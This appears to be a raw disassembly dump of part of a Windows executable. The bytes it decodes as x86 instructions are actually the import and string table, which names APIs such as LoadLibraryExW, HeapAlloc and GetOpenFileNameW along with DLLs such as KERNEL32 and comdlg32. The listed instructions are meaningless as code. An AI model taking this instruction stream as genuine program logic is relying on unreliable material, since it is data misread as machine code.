  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
